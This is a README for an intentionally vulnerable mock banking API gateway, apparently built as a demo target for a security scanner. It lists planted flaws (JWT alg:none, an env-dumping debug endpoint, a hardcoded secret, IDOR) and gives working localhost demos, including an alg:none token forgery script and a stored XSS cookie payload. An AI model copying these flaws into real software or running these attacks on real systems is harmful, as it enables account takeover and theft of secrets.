# banking-app — API Gateway

> **Mock Consumer Banking App** — built to demonstrate [Aikido Security](https://www.aikido.dev) AppSec tooling across a realistic polyglot microservices architecture.

This repository is the **API Gateway** (`Node.js 20 / Express 4`). It sits in front of four downstream services, handles JWT validation middleware, and routes traffic. It is **intentionally vulnerable** — findings are designed to surface in Aikido's SAST, secrets detection, and dependency scanning.

---

## Architecture

```
Client (curl / Swagger UI)
         │
         ▼
┌─────────────────────┐
│  banking-app        │  ← YOU ARE HERE
│  API Gateway :3000  │  Node.js/Express
└──┬──────┬──────┬────┘
   │      │      │
┌──▼──┐ ┌─▼──┐ ┌▼───────┐ ┌────────┐
│auth │ │core│ │products│ │support │
│:8001│ │:8002│ │:8003   │ │:8004   │
└─────┘ └────┘ └────────┘ └────────┘
           │
     PostgreSQL + Redis
```

| Repo | Lang | Port |
|------|------|------|
| `banking-app` ← this repo | Node.js/Express | 3000 |
| `banking-app-auth` | Python/FastAPI | 8001 |
| `banking-app-core` | Python/FastAPI | 8002 |
| `banking-app-products` | Node.js/NestJS | 8003 |
| `banking-app-support` | Node.js/Express | 8004 |

---

## Intentional Vulnerabilities (Aikido demo targets)

| Vulnerability | Location | Category |
|--------------|----------|----------|
| JWT `alg:none` accepted | `src/middleware/auth.js` | Broken Auth |
| CORS wildcard `*` | `src/index.js` | Misconfiguration |
| No rate limiting on auth proxy | `src/index.js` | Missing Control |
| `GET /debug/config` leaks `process.env` | `src/routes/debug.js` | Sensitive Data Exposure |
| Hardcoded `JWT_SECRET` fallback | `src/middleware/auth.js` | Secrets in Code |

---

## Quick Start

### Gateway only

```bash
cp .env.example .env
npm install
npm start
```

The gateway starts on `http://localhost:3000`. Downstream service calls will return 502 until those services are running.

### Full stack (all services)

Clone all repos into the same parent directory:

```
parent/
├── banking-app/          ← this repo
├── banking-app-auth/
├── banking-app-core/
├── banking-app-products/
└── banking-app-support/
```

Then from this directory:

```bash
docker compose up
```

Swagger UI: http://localhost:3000/api-docs

---

## API Reference

### Unauthenticated routes

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/health` | Gateway health check |
| `GET` | `/debug/config` | **[VULN]** Dump env vars |
| `POST` | `/auth/register` | Register a user |
| `POST` | `/auth/login` | Login — returns JWT |
| `POST` | `/auth/refresh` | Refresh access token |

### Authenticated routes (Bearer JWT required)

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/auth/me` | Current user profile |
| `GET` | `/accounts` | List accounts |
| `POST` | `/accounts` | Open new account |
| `GET` | `/accounts/:id` | **[VULN IDOR]** Get account |
| `GET` | `/accounts/:id/transactions` | Transaction history |
| `POST` | `/transfers` | Transfer funds |
| `GET` | `/products` | Product catalog |
| `POST` | `/products/credit-card/apply` | Apply for credit card |
| `POST` | `/products/loan/apply` | Apply for loan |
| `GET` | `/applications/:id` | **[VULN IDOR]** Get application |
| `POST` | `/tickets` | Open support ticket |
| `GET` | `/tickets` | List tickets |
| `GET` | `/tickets/:id` | Get ticket |
| `POST` | `/tickets/:id/messages` | **[VULN XSS]** Post message |

---

## End-to-End curl Walkthrough

### 1. Register a user

```bash
curl -s -X POST http://localhost:3000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"password123"}' | jq
```

### 2. Login — capture JWT

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"password123"}' \
  | jq -r '.access_token')

echo "Token: $TOKEN"
```

### 3. Create a checking account

```bash
curl -s -X POST http://localhost:3000/accounts \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"checking"}' | jq
```

### 4. List accounts

```bash
curl -s http://localhost:3000/accounts \
  -H "Authorization: Bearer $TOKEN" | jq
```

### 5. Transfer funds

```bash
curl -s -X POST http://localhost:3000/transfers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "from_account_id": "<YOUR_ACCOUNT_ID>",
    "to_account_id": "<DEST_ACCOUNT_ID>",
    "amount": 100.00
  }' | jq
```

### 6. Apply for a credit card

```bash
curl -s -X POST http://localhost:3000/products/credit-card/apply \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"annual_income":75000,"employment_status":"employed"}' | jq
```

### 7. Open a support ticket

```bash
curl -s -X POST http://localhost:3000/tickets \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"subject":"My card is not working"}' | jq
```

### 8. Post a message (stored XSS demo)

```bash
curl -s -X POST http://localhost:3000/tickets/<TICKET_ID>/messages \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"body":"<script>alert(document.cookie)</script>"}' | jq
```

---

## Vulnerability Demos

### alg:none JWT bypass

Forge a token with no signature:

```bash
# Build header.payload with alg:none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"1","email":"admin@bank.com","iat":1700000000}' | base64 | tr -d '=' | tr '+/' '-_')
FORGED_TOKEN="${HEADER}.${PAYLOAD}."

curl -s http://localhost:3000/auth/me \
  -H "Authorization: Bearer $FORGED_TOKEN" | jq
```

### Debug endpoint — env var leak

```bash
curl -s http://localhost:3000/debug/config | jq '.env | {JWT_SECRET, DATABASE_URL}'
```

---

## Project Structure

```
banking-app/
├── src/
│   ├── index.js              # Express app, middleware setup, routing
│   ├── middleware/
│   │   └── auth.js           # JWT middleware (alg:none vuln)
│   └── routes/
│       ├── proxy.js          # http-proxy-middleware per service
│       └── debug.js          # /debug/config env dump
├── openapi.yaml              # OpenAPI 3.0 spec (Swagger UI)
├── Dockerfile
├── docker-compose.yml        # Full-stack compose (all 5 services)
├── .env.example
├── .github/
│   └── workflows/
│       └── ci.yml            # Lint + smoke test + Docker build
└── package.json
```

---

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `PORT` | `3000` | Gateway listen port |
| `NODE_ENV` | `development` | Node environment |
| `JWT_SECRET` | `supersecret123` | JWT signing secret (matches auth service) |
| `AUTH_SERVICE_URL` | `http://localhost:8001` | Auth service base URL |
| `CORE_SERVICE_URL` | `http://localhost:8002` | Core banking service base URL |
| `PRODUCTS_SERVICE_URL` | `http://localhost:8003` | Products service base URL |
| `SUPPORT_SERVICE_URL` | `http://localhost:8004` | Support service base URL |
